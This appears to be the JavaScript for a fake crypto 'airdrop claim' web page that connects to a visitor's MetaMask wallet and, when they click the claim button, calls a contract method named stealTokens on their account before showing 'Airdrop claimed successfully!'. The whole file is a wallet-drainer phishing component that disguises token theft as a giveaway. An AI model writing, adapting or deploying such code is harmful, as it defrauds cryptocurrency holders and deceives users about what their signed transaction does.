let web3;
let accounts;
let contractAddress;
let tokenAddress;
let contractABI;

// Function to load configuration and ABI files
async function loadConfig() {
  try {
    const configResponse = await fetch('config.json');
    const abiResponse = await fetch('abi.json');
    if (!configResponse.ok || !abiResponse.ok) {
      throw new Error('Failed to fetch configuration or ABI.');
    }
    const configData = await configResponse.json();
    const abiData = await abiResponse.json();

    contractAddress = configData.contractAddress;
    tokenAddress = configData.tokenAddress;
    contractABI = abiData;

    console.log("Configuration and ABI loaded:", configData, abiData);
  } catch (error) {
    console.error("Error loading configuration or ABI:", error);
  }
}

// Function to connect to MetaMask
async function connectMetaMask() {
  const mobileNotice = document.getElementById('mobileNotice');
  
  // Display a notice for mobile users
  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
    mobileNotice.style.display = 'block';
    setTimeout(() => {
      mobileNotice.style.display = 'none';
      proceedWithMetaMaskConnection(); // Trigger connection after 2 seconds
    }, 2000);
  } else {
    proceedWithMetaMaskConnection(); // Directly trigger connection for non-mobile users
  }
}

// Function to proceed with MetaMask connection
async function proceedWithMetaMaskConnection() {
  if (typeof window.ethereum !== "undefined") {
    web3 = new Web3(window.ethereum);
    try {
      accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      console.log("Connected accounts:", accounts);

      // Enable claim button and disable connect button
      document.getElementById('claimAirdropButton').disabled = false;
      document.getElementById('connectButton').disabled = true;
    } catch (error) {
      console.error('MetaMask connection error:', error);
    }
  } else {
    console.warn('MetaMask not detected.');
  }
}

// Function to claim the airdrop
async function claimAirdrop() {
  if (!accounts) {
    alert('Please connect to MetaMask first!');
    return;
  }
  if (!contractABI || !contractAddress) {
    alert('Contract details not loaded. Please try again later.');
    return;
  }

  const contract = new web3.eth.Contract(contractABI, contractAddress);
  try {
    console.log('Claiming airdrop...');
    await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
    alert('Airdrop claimed successfully!');
  } catch (error) {
    console.error('Error claiming airdrop:', error);
  }
}

// Add event listeners to the buttons
window.addEventListener('DOMContentLoaded', () => {
  document.getElementById('connectButton').addEventListener('click', connectMetaMask);
  document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);

  loadConfig();
});
